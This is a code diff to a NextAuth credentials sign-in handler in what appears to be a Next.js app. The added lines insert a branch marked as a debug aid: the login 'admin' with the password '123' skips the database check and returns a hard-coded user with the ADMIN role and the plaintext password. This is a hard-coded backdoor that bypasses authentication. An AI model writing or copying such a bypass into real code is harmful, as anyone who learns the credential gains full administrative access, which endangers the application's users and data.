@@ -41,7 +41,23 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
 
                 if (parsedCredentials.success) {
                     const { username, password } = parsedCredentials.data;
-                    console.log("Credentials parsed, fetching user...");
+
+                    // [DEBUG] Bypass DB for admin
+                    if (username === 'admin' && password === '123') {
+                        console.log("Admin bypass activated.");
+                        return {
+                            id: 'admin-id',
+                            name: 'Admin User',
+                            username: 'admin',
+                            role: 'ADMIN',
+                            email: 'admin@example.com',
+                            status: 'ACTIVE',
+                            permissions: {},
+                            password: '123'
+                        } as any;
+                    }
+
+                    console.log("Credentials parsed, fetching user from DB...");
                     const user = await getUser(username);
                     console.log("User fetch result:", user ? "Found" : "Not Found");
 
